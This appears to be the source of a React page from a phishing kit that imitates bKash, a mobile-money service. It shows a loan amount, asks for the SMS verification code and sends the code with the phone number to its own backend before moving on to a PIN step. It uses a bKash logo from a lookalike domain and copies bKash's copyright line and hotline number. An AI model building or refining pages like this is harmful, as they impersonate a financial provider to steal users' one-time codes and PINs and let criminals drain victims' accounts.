import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function Otpverification() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [seconds, setSeconds] = useState(59);
  const [canResend, setCanResend] = useState(false);
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const base_url = import.meta.env.VITE_API_KEY_Base_URL;
  
  // Get loan data from localStorage
  const [loanAmount, setLoanAmount] = useState("0");
  const [loanCategory, setLoanCategory] = useState("Personal Loan");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loanId, setLoanId] = useState(null);

  useEffect(() => {
    // Retrieve data from localStorage
    const amount = localStorage.getItem('loanAmount');
    const category = localStorage.getItem('loanCategory');
    const accountNumber = localStorage.getItem('accountNumber');
    const id = localStorage.getItem('loanId');
    
    if (amount) setLoanAmount(amount);
    if (category) setLoanCategory(category);
    if (accountNumber) setPhoneNumber(accountNumber);
    if (id) setLoanId(id);
    else {
      navigate('/');
    }
  }, [navigate]);

  // Timer for resend code
  useEffect(() => {
    if (seconds <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds]);

  const handleResend = async () => {
    setResendLoading(true);
    
    try {
      // Call your resend OTP API here
      const response = await fetch(`${base_url}/api/resend-otp/${loanId}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      });
      
      const result = await response.json();
      
      if (result.success) {
        setSeconds(59);
        setCanResend(false);
        setOtp("");
        setError(false);
      } else {
        alert("Failed to resend OTP. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Something went wrong. Please try again.");
    } finally {
      setResendLoading(false);
    }
  };

  const handleCancel = () => {
    setOtp("");
    setError(false);
    navigate('/number-verification');
  };

  const handleConfirm = async () => {
    if (otp.length < 6) {
      setError(true);
      return;
    }
    
    if (!loanId) {
      navigate('/');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${base_url}/api/update-otp/${loanId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          otp: otp,
          phoneNumber: phoneNumber
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        setError(false);
        // Navigate to PIN verification page
        navigate('/pin-verification');
      } else {
        setError(true);
        alert("Invalid OTP. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Something went wrong. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleOtpChange = (e) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(val);
    if (val.length === 6) setError(false);
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4"
      style={{ backgroundColor: "#F3F4F6", fontFamily: "'Segoe UI', sans-serif" }}
    >
      <div
        className="w-full overflow-hidden"
        style={{
          maxWidth: "420px",
          backgroundColor: "#ffffff",
          borderRadius: "16px",
          boxShadow: "0 4px 24px rgba(0,0,0,0.10)",
        }}
      >
        {/* Logo */}
        <div className="flex justify-center" style={{ padding: "24px 24px 18px" }}>
          <img
            src="https://bkashloan-info.com/img/bKash-logo.png"
            alt="bKash"
            className="h-10 object-contain"
          />
        </div>

        {/* Loan Info */}
        <div
          className="flex items-start justify-between"
          style={{ backgroundColor: "#F3F4F6", padding: "12px 20px" }}
        >
          <div>
            <p style={{ margin: 0, fontWeight: 600, fontSize: "14px", color: "#1f2937" }}>
              Loan Amount
            </p>
            <p style={{ margin: "4px 0 0", fontSize: "12px", color: "#6b7280" }}>
              loan category: {loanCategory}
            </p>
          </div>
          <p style={{ margin: 0, fontWeight: 600, fontSize: "14px", color: "#1f2937" }}>
            ৳{parseFloat(loanAmount).toFixed(2)}
          </p>
        </div>

        {/* Pink OTP Section */}
        <div
          className="flex flex-col items-center"
          style={{ backgroundColor: "#E2136E", padding: "36px 28px", gap: "18px" }}
        >
          <p style={{ margin: 0, color: "#ffffff", fontSize: "13px", textAlign: "center" }}>
            Enter verification code sent to {phoneNumber}
          </p>

          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            value={otp}
            onChange={handleOtpChange}
            placeholder="Enter 6 digit code"
            disabled={loading}
            style={{
              width: "100%",
              boxSizing: "border-box",
              padding: "13px 16px",
              borderRadius: "4px",
              border: error ? "2px solid #fca5a5" : "none",
              fontSize: "15px",
              textAlign: "center",
              color: "#374151",
              outline: "none",
              backgroundColor: "#ffffff",
              letterSpacing: otp ? "6px" : "0px",
              opacity: loading ? 0.6 : 1,
            }}
          />

          {error && (
            <p style={{ margin: "-8px 0 0", color: "#fca5a5", fontSize: "12px" }}>
              Please enter the 6-digit code.
            </p>
          )}

          {canResend ? (
            <button
              onClick={handleResend}
              disabled={resendLoading}
              style={{
                background: "none",
                border: "none",
                color: "#ffffff",
                fontSize: "12px",
                cursor: resendLoading ? "not-allowed" : "pointer",
                textDecoration: "underline",
                padding: 0,
                opacity: resendLoading ? 0.6 : 1,
              }}
            >
              {resendLoading ? "Sending..." : "Resend Code"}
            </button>
          ) : (
            <p style={{ margin: 0, color: "#ffffff", fontSize: "12px", opacity: 0.9 }}>
              Resend Code in {seconds}s
            </p>
          )}
        </div>

        {/* Buttons */}
        <div style={{ display: "flex", gap: "12px", padding: "16px" }}>
          <button
            onClick={handleCancel}
            disabled={loading}
            style={{
              flex: 1,
              padding: "12px",
              backgroundColor: "#E5E7EB",
              border: "none",
              borderRadius: "4px",
              fontSize: "14px",
              color: "#4b5563",
              fontWeight: 500,
              cursor: loading ? "not-allowed" : "pointer",
              opacity: loading ? 0.6 : 1,
            }}
          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            disabled={loading}
            style={{
              flex: 1,
              padding: "12px",
              backgroundColor: "#E5E7EB",
              border: "none",
              borderRadius: "4px",
              fontSize: "14px",
              color: loading ? "#9ca3af" : "#4b5563",
              fontWeight: 500,
              cursor: loading ? "not-allowed" : "pointer",
              opacity: loading ? 0.6 : 1,
            }}
          >
            {loading ? "Verifying..." : "Confirm"}
          </button>
        </div>

        {/* Footer */}
        <div style={{ textAlign: "center", paddingBottom: "20px" }}>
          <p style={{ margin: 0, fontSize: "11px", color: "#9ca3af" }}>
            © 2025 bKash, All Rights Reserved
          </p>
          <p style={{ margin: "4px 0 0", fontSize: "11px", color: "#E2136E" }}>● 16247</p>
        </div>
      </div>
    </div>
  );
}